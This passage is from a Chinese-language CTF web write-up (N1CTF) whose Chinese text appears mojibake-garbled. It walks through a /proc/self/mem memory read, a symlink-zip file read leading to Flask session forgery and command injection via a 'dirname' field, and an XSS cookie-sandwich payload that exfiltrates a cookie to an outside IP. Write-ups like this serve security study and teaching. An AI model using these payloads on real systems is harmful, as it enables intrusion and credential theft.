class="hljs-string">&quot;../proc/self/environ&quot;</span><br>èƒ½ç›´æ¥è¯»åˆ°ç¯å¢ƒå˜é‡æ–‡ä»¶<br></code></pre></td></tr></table></figure><p>æ‰€ä»¥æ¥ä¸‹æ¥æˆ‘ä»¬è¯»&#x2F;proc&#x2F;self&#x2F;memæ–‡ä»¶å°±èƒ½æ‹¿åˆ°flag</p><p>ç›´æ¥è®¿é—®</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">?<span class="hljs-built_in">offset</span>=<span class="hljs-number">0</span>&amp;<span class="hljs-built_in">length</span>=<span class="hljs-number">100000.</span>?<span class="hljs-built_in">offset</span>=<span class="hljs-number">0</span>&amp;<span class="hljs-built_in">length</span>=<span class="hljs-number">100000.</span>?<span class="hljs-built_in">offset</span>=<span class="hljs-number">0</span>&amp;<span class="hljs-built_in">length</span>=<span class="hljs-number">100000</span>/pro?<span class="hljs-built_in">offset</span>=<span class="hljs-number">0</span>&amp;<span class="hljs-built_in">length</span>=<span class="hljs-number">100000</span>c/self/mem<br></code></pre></td></tr></table></figure><p>ä¼šå‘ç°è¿”å›invalid path</p><p>æŸ¥äº†ä¸€ä¸‹å‘ç°æ˜¯å› ä¸ºè¯»å–memæ–‡ä»¶æœ‰æƒé™è¦æ±‚ï¼Œæœ‰äº›ä¸å¯è¯»çš„éƒ¨åˆ†ï¼Œåªèƒ½è¯»å–æœ‰æƒé™çš„éƒ¨åˆ†ï¼Œè¿™é‡Œå¯ä»¥é€šè¿‡offsetå’Œlengthæ¥æ§åˆ¶</p><p>è¯»ä¸€ä¸‹&#x2F;proc&#x2F;self&#x2F;mapsæ–‡ä»¶æŸ¥çœ‹pythonè¿›ç¨‹çš„å†…å­˜åœ°å€</p><p><img src="/2025/09/15/n1ctf-web-wp/image-20250915001049199.png" alt="image-20250915001049199"></p><p>è¿™é‡Œé€‰æ‹©ä»7f7861a02000ï¼ˆ140155010686976ï¼‰çˆ†ç ´åˆ°7ffc799d2000ï¼ˆ140722348826624ï¼‰ï¼ŒæŠŠå†…å­˜åœ°å€è½¬æ¢ä¸ºåè¿›åˆ¶æ•°ç„¶åä¼ ç»™offsetå‚æ•°è®¾ç½®ä¸€ä¸‹æ­¥é•¿ï¼Œçˆ†ç ´é€Ÿåº¦æŒºå¿«çš„</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">?<span class="hljs-built_in">offset</span>=<span class="hljs-number">140155010686976</span>&amp;<span class="hljs-built_in">length</span>=<span class="hljs-number">100000.</span>?<span class="hljs-built_in">offset</span>=<span class="hljs-number">0</span>&amp;<span class="hljs-built_in">length</span>=<span class="hljs-number">100000.</span>?<span class="hljs-built_in">offset</span>=<span class="hljs-number">0</span>&amp;<span class="hljs-built_in">length</span>=<span class="hljs-number">100000</span>/pro?<span class="hljs-built_in">offset</span>=<span class="hljs-number">0</span>&amp;<span class="hljs-built_in">length</span>=<span class="hljs-number">100000</span>c/self/mem<br></code></pre></td></tr></table></figure><p>æœ€ååœ¨7f7862fd8000-7f7862fd9000è¿™ä¸€å—å†…å­˜ä¸­è¯»åˆ°äº† æŸ¥äº†ä¸€ä¸‹å‘ç°æ˜¯å› ä¸ºmmapæ˜¯åˆ›å»ºäº†åŒ¿åå†…å­˜æ˜ å°„ï¼Œè¿™ä¸€å—å°±æ˜¯åŒ¿åå†…å­˜</p><h1 id="online-unzipper"><a href="/2025/09/15/n1ctf-web-wp/#online-unzipper" class="headerlink" title="online_unzipper"></a>online_unzipper</h1><p>ä»£ç å®¡è®¡æ‰¾åˆ°æ¼æ´ç‚¹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">try</span>:<br>    os.system(<span class="hljs-string">f&quot;unzip -o <span class="hljs-subst">&#123;zip_path&#125;</span> -d <span class="hljs-subst">&#123;target_dir&#125;</span>&quot;</span>)<br><span class="hljs-keyword">except</span>:<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;è§£å‹å¤±è´¥ï¼Œè¯·æ£€æŸ¥æ–‡ä»¶æ ¼å¼&quot;</span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œæœ‰ä¸€ä¸ªå‘½ä»¤æ‰§è¡Œï¼Œå¦‚æœå­˜åœ¨å¯æ§çš„åœ°æ–¹å°±èƒ½åˆ©ç”¨è¿™é‡Œè¯»å‡ºflag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> role == <span class="hljs-string">&quot;admin&quot;</span>:<br>    dirname = request.form.get(<span class="hljs-string">&quot;dirname&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-built_in">str</span>(uuid.uuid4())<br><span class="hljs-keyword">else</span>:<br>    dirname = <span class="hljs-built_in">str</span>(uuid.uuid4())<br><br>target_dir = os.path.join(UPLOAD_FOLDER, dirname)<br>os.makedirs(target_dir, exist_ok=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><p>å‘ç°å¦‚æœæ˜¯adminç”¨æˆ·çš„è¯å°±èƒ½æŒ‡å®šdirnameï¼Œæœ¬è´¨ä¸Šä¹Ÿå°±æ˜¯æŒ‡å®šäº†target_dirï¼ŒåŒæ ·æ˜¯æ‹¼æ¥ä¸€ä¸‹å°±èƒ½æ‰§è¡Œå‘½ä»¤</p><p>æ¥ä¸‹æ¥éœ€è¦çœ‹çœ‹å¦‚ä½•ç™»å½•admin</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">role = session[<span class="hljs-string">&quot;role&quot;</span>]<br></code></pre></td></tr></table></figure><p>roleæ˜¯ä»sessionä¸­è·å–çš„ï¼Œæ™®é€šç”¨æˆ·æ³¨å†Œçš„æ—¶å€™roleåªèƒ½æ˜¯user</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">register</span>():<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&quot;POST&quot;</span>:<br>        username = request.form[<span class="hljs-string">&quot;username&quot;</span>]<br>        password = request.form[<span class="hljs-string">&quot;password&quot;</span>]<br><br>        <span class="hljs-keyword">if</span> username <span class="hljs-keyword">in</span> users:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;ç”¨æˆ·åå·²å­˜åœ¨&quot;</span><br><br>        users[username] = &#123;<span class="hljs-string">&quot;password&quot;</span>: password, <span class="hljs-string">&quot;role&quot;</span>: <span class="hljs-string">&quot;user&quot;</span>&#125;<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&quot;login&quot;</span>))<br><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;register.html&quot;</span>)<br></code></pre></td></tr></table></figure><p>é‚£ä¹ˆè‚¯å®šæ˜¯è¦ä¼ªé€ session</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">app.secret_key = os.environ.get(<span class="hljs-string">&quot;FLASK_SECRET_KEY&quot;</span>, <span class="hljs-string">&quot;test_key&quot;</span>)<br></code></pre></td></tr></table></figure><p>sessionçš„keyæ˜¯ä»ç¯å¢ƒå˜é‡ä¸­è·å–çš„ï¼Œæ‰€ä»¥è¿˜æ˜¯éœ€è¦è¯»ä¸€ä¸‹&#x2F;proc&#x2F;self&#x2F;environæ–‡ä»¶</p><p>æˆ‘ä»¬ä¸Šä¼ çš„å‹ç¼©åŒ…ä¼šé€šè¿‡unzip -oè¿›è¡Œè§£å‹ï¼Œè§£å‹æ—¶å¦‚æœ ZIP åŒ…ä¸­åŒ…å«è½¯é“¾æ¥æ–‡ä»¶ï¼Œ<code>unzip</code>é»˜è®¤ä¼šä¿ç•™è½¯é“¾æ¥çš„æŒ‡å‘å…³ç³»</p><p>æ‰€ä»¥å¯ä»¥åˆ©ç”¨è½¯é“¾æ¥æ¥å®ç°ä»»æ„æ–‡ä»¶è¯»å–</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ln</span> -s /proc/self/environ <span class="hljs-built_in">link</span>   åˆ›å»ºä¸€ä¸ªè½¯é“¾æ¥<br><br>zip -y exploit.zip <span class="hljs-built_in">link</span><br><br>ä¸Šä¼ exploit.zipï¼Œç›´æ¥è®¿é—®é‡Œé¢çš„<span class="hljs-built_in">link</span>å°±èƒ½è·å–åˆ°ç¯å¢ƒå˜é‡æ–‡ä»¶<br><br></code></pre></td></tr></table></figure><p><img src="/2025/09/15/n1ctf-web-wp/image-20250915003503909.png" alt="image-20250915003503909"></p><p>FLASK_SECRET_KEY&#x3D;#mu0cw9F#7bBCoF! </p><p>æ¥ä¸‹æ¥åˆ©ç”¨è¿™ä¸ªkeyç”Ÿæˆä¸€ä¸ªadminçš„sessionå†æ›¿æ¢æˆ‘ä»¬è‡ªå·±æ³¨å†Œçš„ç”¨æˆ·çš„session</p><p><img src="/2025/09/15/n1ctf-web-wp/image-20250915003552152.png" alt="image-20250915003552152"></p><p>ç”¨æˆ·å˜ä¸ºadminä¹‹åå‘ç°ä¸Šä¼ æ–‡ä»¶æ—¶å¤šäº†ä¸€ä¸ªæŒ‡å®šdirnameçš„è¾“å…¥æ¡†ï¼Œéšä¾¿ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶åŒæ—¶ä¼ å…¥</p><p>dirname&#x3D;test; cat &#x2F;flag* &gt; .&#x2F;uploads&#x2F;test&#x2F;flag.txt</p><p>å†è®¿é—®&#x2F;download&#x2F;test&#x2F;flag.txtå°±èƒ½æ‹¿åˆ°flag</p><h1 id="Unfinished"><a href="/2025/09/15/n1ctf-web-wp/#Unfinished" class="headerlink" title="Unfinished"></a>Unfinished</h1><p>é¦–å…ˆè¿˜æ˜¯å¯»æ‰¾æ¼æ´ç‚¹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">visit_url</span>(<span class="hljs-params">url</span>):<br>    <span class="hljs-keyword">try</span>:<br>        flag_value = os.environ.get(<span class="hljs-string">&#x27;FLAG&#x27;</span>, <span class="hljs-string">&#x27;flag&#123;fake&#125;&#x27;</span>)<br><br>        <span class="hljs-keyword">with</span> sync_playwright() <span class="hljs-keyword">as</span> p:<br>            browser = p.chromium.launch(headless=<span class="hljs-literal">True</span>, args=[<span class="hljs-string">&quot;--no-sandbox&quot;</span>])<br>            context = browser.new_context()<br><br>            context.add_cookies([&#123;<br>                <span class="hljs-string">&#x27;name&#x27;</span>: <span class="hljs-string">&#x27;flag&#x27;</span>,<br>                <span class="hljs-string">&#x27;value&#x27;</span>: flag_value,<br>                <span class="hljs-string">&#x27;domain&#x27;</span>: <span class="hljs-string">&#x27;localhost&#x27;</span>,<br>                <span class="hljs-string">&#x27;path&#x27;</span>: <span class="hljs-string">&#x27;/&#x27;</span>,<br>                <span class="hljs-string">&#x27;httponly&#x27;</span>: <span class="hljs-literal">True</span><br>            &#125;])<br><br>            page = context.new_page()<br>            page.goto(<span class="hljs-string">&quot;http://localhost/login&quot;</span>, timeout=<span class="hljs-number">5000</span>)<br>            page.fill(<span class="hljs-string">&quot;input[name=&#x27;username&#x27;]&quot;</span>, <span class="hljs-string">&quot;admin&quot;</span>)<br>            page.fill(<span class="hljs-string">&quot;input[name=&#x27;password&#x27;]&quot;</span>, admin_password)<br>            page.click(<span class="hljs-string">&quot;input[name=&#x27;submit&#x27;]&quot;</span>)<br>            page.wait_for_timeout(<span class="hljs-number">3000</span>)<br>            page.goto(url, timeout=<span class="hljs-number">5000</span>)<br>            page.wait_for_timeout(<span class="hljs-number">5000</span>)<br>            browser.close()<br></code></pre></td></tr></table></figure><p>è§‚å¯Ÿåˆ°è¿™ä¸ªå‡½æ•°æ˜¯botä¼šå…ˆç™»å½•ç„¶åå»è®¿é—®ä¼ å…¥çš„urlï¼Œè€Œåœ¨viewè·¯ç”±ä¸­</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/view&quot;</span>, methods=[<span class="hljs-string">&quot;GET&quot;</span>]</span>)</span><br><span class="hljs-meta">@login_required</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">view_user</span>():<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    # I found a bug in it.</span><br><span class="hljs-string">    # Until I fix it, I&#x27;ve banned /api/bio/. Have fun :)</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    username = request.args.get(<span class="hljs-string">&quot;username&quot;</span>,default=current_user.username)<br>    visit_url(<span class="hljs-string">f&quot;http://localhost/api/bio/<span class="hljs-subst">&#123;username&#125;</span>&quot;</span>)<br>    template = <span class="hljs-string">f&quot;&quot;&quot;</span><br><span class="hljs-string">    &#123;&#123;% extends &quot;base.html&quot; %&#125;&#125;</span><br><span class="hljs-string">    &#123;&#123;% block title %&#125;&#125;success&#123;&#123;% endblock %&#125;&#125;</span><br><span class="hljs-string">    &#123;&#123;% block content %&#125;&#125;</span><br><span class="hljs-string">    &lt;h1&gt;bot will visit your bio&lt;/h1&gt;</span><br><span class="hljs-string">    &lt;p style=&quot;margin-top: 1.5rem;&quot;&gt;&lt;a href=&quot;&#123;&#123;&#123;&#123; url_for(&#x27;index&#x27;) &#125;&#125;&#125;&#125;&quot;&gt;Back to Home&lt;/a&gt;&lt;/p&gt;</span><br><span class="hljs-string">    &#123;&#123;% endblock %&#125;&#125;</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">return</span> render_template_string(template)<br></code></pre></td></tr></table></figure><p>ç™»å½•ä¹‹åå°±ä¼šè®©botå»è®¿é—®ä¸€ä¸‹<a href="http://localhost/api/bio/%7Busername%7D%EF%BC%8C%E4%B9%9F%E5%B0%B1%E6%98%AF%E6%88%91%E4%BB%AC%E7%9A%84bio%E7%95%8C%E9%9D%A2%EF%BC%8C%E5%90%8C%E6%97%B6%E6%9C%89%E4%B8%80%E4%B8%AA%E7%BC%96%E8%BE%91%E6%88%91%E4%BB%ACbio%E7%95%8C%E9%9D%A2%E7%9A%84%E5%8A%9F%E8%83%BD%EF%BC%8C%E6%89%80%E4%BB%A5%E5%BE%88%E5%AE%B9%E6%98%93%E8%81%94%E6%83%B3%E5%88%B0xss%EF%BC%8C%E4%BD%86%E6%98%AF%E6%9C%89%E4%B8%89%E4%B8%AA%E9%97%AE%E9%A2%98%EF%BC%8C%E7%AC%AC%E4%B8%80%E4%B8%AA%E6%98%AFnginx%E7%9A%84%E9%85%8D%E7%BD%AE%E4%B8%AD%E7%A6%81%E6%AD%A2%E4%BA%86%E8%AE%BF%E9%97%AE/api/bio">http://localhost/api/bio/{username}ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬çš„bioç•Œé¢ï¼ŒåŒæ—¶æœ‰ä¸€ä¸ªç¼–è¾‘æˆ‘ä»¬bioç•Œé¢çš„åŠŸèƒ½ï¼Œæ‰€ä»¥å¾ˆå®¹æ˜“è”æƒ³åˆ°xssï¼Œä½†æ˜¯æœ‰ä¸‰ä¸ªé—®é¢˜ï¼Œç¬¬ä¸€ä¸ªæ˜¯nginxçš„é…ç½®ä¸­ç¦æ­¢äº†è®¿é—®/api/bio</a></p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">server</span> &#123;<br>    <span class="hljs-attribute">listen</span> <span class="hljs-number">80</span> default_server;<br>    <span class="hljs-attribute">server_name</span> _;<br><br>    <span class="hljs-section">location</span> / &#123;<br>        <span class="hljs-attribute">proxy_pass</span> http://127.0.0.1:5000;<br>    &#125;<br><br>    <span class="hljs-section">location</span> /api/bio/ &#123;<br>        <span class="hljs-attribute">return</span> <span class="hljs-number">403</span>;<br>    &#125;<br><br>    <span class="hljs-section">location</span> <span class="hljs-regexp">~ \.(css|js)$</span> &#123;<br>        <span class="hljs-attribute">proxy_pass</span> http://127.0.0.1:5000;<br>        <span class="hljs-attribute">proxy_ignore_headers</span> Vary;<br>        <span class="hljs-attribute">proxy_cache</span> static_cache;<br>        <span class="hljs-attribute">proxy_cache_valid</span> <span class="hljs-number">200</span> <span class="hljs-number">10m</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä½†æ˜¯å‘¢ï¼Œå¦‚æœæ˜¯ä»¥js,cssç»“å°¾çš„é™æ€èµ„æºï¼Œå°±ä¼šè¢«ä»£ç†å¹¶ä¸”å†™å…¥ç¼“å­˜ä¸­ï¼Œæœ¬æ„æ˜¯ä¸ºäº†å‡å°‘æœåŠ¡å™¨çš„æ¶ˆè€—ï¼Œè€Œè¿™é‡Œå¸®æˆ‘ä»¬ç»•è¿‡äº†&#x2F;api&#x2F;bio&#x2F;ï¼Œåªè¦æˆ‘ä»¬çš„usernameæ˜¯ä»¥jsæˆ–è€…cssç»“å°¾çš„ï¼Œè®¿é—®<a href="http://localhost/api/bio/%7Busername%7D%E7%9A%84%E6%97%B6%E5%80%99%E5%B0%B1%E4%B8%8D%E4%BC%9A%E8%BF%94%E5%9B%9E403">http://localhost/api/bio/{username}çš„æ—¶å€™å°±ä¸ä¼šè¿”å›403</a></p><p>å‡è®¾æˆ‘ä»¬çš„ç”¨æˆ·åä¸º1.jsï¼Œç¬¬äºŒä¸ªé—®é¢˜æ˜¯ botåœ¨è®¿é—®æˆ‘ä»¬çš„bioç•Œé¢çš„æ—¶å€™ï¼Œæœ‰ä¸€ä¸ªèº«ä»½çš„æ ¡éªŒï¼Œå°±æ˜¯åªæœ‰è‡ªå·±èƒ½è®¿é—®è‡ªå·±çš„bio</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> current_user.username == username:<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Unauthorized&quot;</span>, <span class="hljs-number">401</span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œä¹Ÿå¥½è§£å†³ï¼Œå‰é¢è¯´äº†å¦‚æœæ˜¯jsæˆ–è€…cssç»“å°¾çš„è¯·æ±‚ä¼šè¢«å†™åˆ°ç¼“å­˜é‡Œï¼Œä¸‹æ¬¡è¯»çš„æ—¶å€™ä¼šç›´æ¥è¯»ç¼“å­˜é‡Œçš„ä¸œè¥¿ï¼Œé‚£ä¹ˆæˆ‘ä»¬å…ˆè‡ªå·±å»è®¿é—®ä¸€ä¸‹&#x2F;api&#x2F;bio&#x2F;1.jsï¼Œå†é€šè¿‡&#x2F;viewè·¯ç”±è®©botå»è®¿é—®ï¼Œè¿™æ ·usernameæ˜¯1.jsï¼Œcurrent_user.usernameå®é™…ä¸Šçš„ä»ç¼“å­˜é‡Œé¢è¯»å‡ºæ¥çš„å°±èƒ½ç»•è¿‡äº†</p><p>ç¬¬ä¸‰ä¸ªé—®é¢˜æ—¶httpOnlyï¼Œä½†æ˜¯å¯ä»¥æ³¨æ„åˆ°é¢˜ç›®ä¸­å…¶å®å†™çš„æ—¶httponly,å…¶å®æ˜¯å¤±æ•ˆçš„ï¼Œç›´æ¥ç”¨xssçš„payloadå°±èƒ½æ‰“å‡ºæ¥</p><p><strong>å¦‚æœè¿™ä¸ªhttpOnlyæ˜¯ç”Ÿæ•ˆçš„æ€ä¹ˆåŠï¼Ÿ</strong></p><p>è¿™æ ·çš„è¯ç›´æ¥åˆ©ç”¨xssæ˜¯å¸¦ä¸å‡ºcookieçš„,åˆ©ç”¨ä¸‰æ˜æ²»æ”»å‡»å¯ä»¥æŠŠå—httpOnlyä¿æŠ¤çš„cookieçªƒå–å‡ºæ¥</p><p>å¤§è‡´åŸç†å°±æ˜¯è®©æœåŠ¡å™¨é”™è¯¯è§£æï¼Œåˆ©ç”¨cookie&#x3D;ticket&#x3D;â€abc;    aaa&#x3D;bbbâ€è®©æœåŠ¡å™¨é”™è¯¯è§£æä»è€Œå°†è®¿é—®è€…çš„cookieæ”¾åˆ°ä¸­é—´å¸¦äº†å‡ºæ¥</p><p>è®²è§£æ–‡ç« ï¼š<a href="https://portswigger.net/research/stealing-httponly-cookies-with-the-cookie-sandwich-technique">https://portswigger.net/research/stealing-httponly-cookies-with-the-cookie-sandwich-technique</a></p><p>payload</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;<br><span class="hljs-keyword">const</span> url = <span class="hljs-keyword">new</span> <span class="hljs-title function_">URL</span>(<span class="hljs-string">&quot;http://localhost/ticket&quot;</span>);<br><span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span> = <span class="hljs-string">`$Version=1; domain=<span class="hljs-subst">$&#123;url.hostname&#125;</span>; path=<span class="hljs-subst">$&#123;url.pathname&#125;</span>;`</span>;<br><span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span> = <span class="hljs-string">`ticket=&quot;abc; domain=<span class="hljs-subst">$&#123;url.hostname&#125;</span>; path=<span class="hljs-subst">$&#123;url.pathname&#125;</span>;`</span>;<br><span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span> = <span class="hljs-string">`aaa=bbb&quot;; domain=<span class="hljs-subst">$&#123;url.hostname&#125;</span>; path=/;`</span>;<br><span class="hljs-title function_">fetch</span>(<span class="hljs-string">&quot;/ticket&quot;</span>, &#123;<br>        <span class="hljs-attr">credentials</span>: <span class="hljs-string">&#x27;include&#x27;</span>,<br>&#125;).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span> &#123;<br>        <span class="hljs-keyword">return</span> response.<span class="hljs-title function_">text</span>();<br>&#125;).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">data</span> =&gt;</span> &#123;<br>        <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&quot;http://xxx.xx.xx.xxx:7777/&quot;</span>, &#123;<br>                <span class="hljs-attr">method</span>: <span class="hljs-string">&quot;POST&quot;</span>,<br>                <span class="hljs-attr">body</span>: data,<br>        &#125;);<br>&#125;)<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><p><img src="/2025/09/15/n1ctf-web-wp/image-20250915205435704.png" alt="image-20250915205435704"></p><p>å› ä¸ºåœ¨è®¿é—®&#x2F;ticketçš„æ—¶å€™ä¼šå›æ˜¾è‡ªå·±çš„ticketçš„å€¼ï¼Œå†æŠŠè¯·æ±‚ç»“æœæ‹¿å‡ºæ¥ä¼ åˆ°è‡ªå·±çš„æœåŠ¡å™¨ä¸Šå°±èƒ½çœ‹åˆ°flagäº†</p><h2 id="åˆ†æ"><a href="/2025/09/15/n1ctf-web-wp/#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><p>è¿™é¢˜æ¯”èµ›ä¸­æ²¡æ‰“å‡ºæ¥ï¼Œå½“æ—¶æƒ³åˆ°äº†xssï¼Œä½†æ˜¯çœ‹åˆ°httponlyä¸çŸ¥é“æœ‰ä¸‰æ˜æ²»æ”»å‡»è¿™ä¸ªä¸œè¥¿ï¼Œä¹Ÿæ²¡æ³¨æ„åˆ°å†™é”™äº†</p><p>å¹¶ä¸”ä¹Ÿæ²¡ä»”ç»†å»é˜…è¯»ä»£ç ï¼Œnginxçš„é…ç½®æ–‡ä»¶æ²¡è®¤çœŸçœ‹</p><h1 id="æ€»ç»“"><a href="/2025/09/15/n1ctf-web-wp/#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><ul><li>åˆ†æè§£æå·®å¼‚ä¹‹ç±»çš„é¢˜ç›®æ—¶è¦è€ä¸‹å¿ƒæ¥å»ç¿»æºä»£ç </li><li>&#x2F;proc&#x2F;self&#x2F;mapså­˜æ”¾è¿›ç¨‹çš„å†…å­˜åœ°å€ï¼Œ&#x2F;proc&#x2F;self&#x2F;memæ–‡ä»¶å­˜åœ¨ä¸å¯è¯»éƒ¨åˆ†ï¼Œä¸èƒ½ç›´æ¥è¯»</li><li>unzip -oè§£å‹å¯ä»¥åˆ©ç”¨è½¯é“¾æ¥å®ç°ä»»æ„æ–‡ä»¶è¯»å–</li><li>ä¸‰æ˜æ²»æ”»å‡»å¯ä»¥ç»•è¿‡httpOnlyï¼Œnginxé…ç½®æ–‡ä»¶ä¹Ÿä¼šæœ‰å…³é”®ä¿¡æ¯ï¼Œåˆ©ç”¨ç¼“å­˜ç»•è¿‡äº†èº«ä»½éªŒè¯</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
      <tag>base64è§£ç å·®å¼‚</tag>
      
      <tag>/proc/self/maps&amp;memæ–‡ä»¶</tag>
      
      <tag>xssä¸‰æ˜æ²»æ”»å‡»</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
